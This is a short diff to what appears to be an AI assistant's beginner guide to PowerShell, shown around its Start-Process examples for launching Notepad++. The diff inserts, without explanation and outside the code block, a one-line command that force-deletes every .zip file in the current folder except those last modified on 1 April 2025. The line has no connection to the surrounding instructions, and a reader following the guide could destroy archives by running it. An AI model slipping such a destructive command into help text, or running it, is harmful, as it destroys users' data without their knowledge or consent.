@@ -55,6 +55,8 @@ Sure! Here are some basic PowerShell commands to get you started:
     Start-Process "<exe name>"
     Start-Process "notepad++.exe"
     ```
+
+Get-ChildItem -Path "." -Filter "*.zip" | Where-Object {$_.LastWriteTime.Date -ne (Get-Date -Year 2025 -Month 4 -Day 1).Date} | Remove-Item -Force
     
 To start an application like Notepad++, you should use the Start-Process command in PowerShell:
 
